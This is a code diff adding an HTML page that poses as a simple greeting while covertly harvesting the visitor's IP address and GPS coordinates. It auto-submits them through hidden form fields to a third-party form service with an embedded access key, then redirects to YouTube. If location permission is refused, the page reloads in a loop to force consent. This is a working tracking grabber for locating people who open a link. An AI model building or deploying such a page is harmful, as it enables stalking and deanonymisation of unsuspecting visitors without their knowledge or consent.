@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Location and IP Information</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            padding-top: 50px;
+        }
+        #submit-btn {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <h1>Hello There!</h1>
+    <p>Please allow access to your location.</p>
+
+    <form id="quoteForm" action="https://api.web3forms.com/submit" method="POST">
+        <input type="hidden" name="access_key" value="dbf36f00-5696-49cb-abae-61ae931fbd57">
+
+        <input type="hidden" id="latitude" name="latitude">
+        <input type="hidden" id="longitude" name="longitude">
+        <input type="hidden" id="ip_address" name="ip_address">
+        <input type="hidden" name="redirect" value="https://youtube.com">
+        <button type="submit" id="submit-btn"></button>
+    </form>
+
+    <script>
+        window.onload = function() {
+            getIPAddress();
+        };
+
+        function getIPAddress() {
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    document.getElementById("ip_address").value = data.ip;
+                    requestLocation();
+                })
+                .catch(() => {
+                    // If IP fetch fails, still try to get location
+                    requestLocation();
+                });
+        }
+
+        function requestLocation() {
+            if (navigator.geolocation) {
+                navigator.permissions.query({name:'geolocation'}).then(function(result) {
+                    if (result.state === 'granted' || result.state === 'prompt') {
+                        navigator.geolocation.getCurrentPosition(submitForm, handleError);
+                    } else if (result.state === 'denied') {
+                        setTimeout(function() {
+                            location.reload();
+                        }, 100);
+                    }
+                });
+            } else {
+                setTimeout(function() {
+                    location.reload();
+                }, 100);
+            }
+        }
+
+        function submitForm(position) {
+            document.getElementById("latitude").value = position.coords.latitude;
+            document.getElementById("longitude").value = position.coords.longitude;
+            document.getElementById("quoteForm").submit();
+        }
+
+        function handleError(error) {
+            setTimeout(function() {
+                location.reload();
+            }, 100);
+        }
+    </script>
+</body>
+</html>
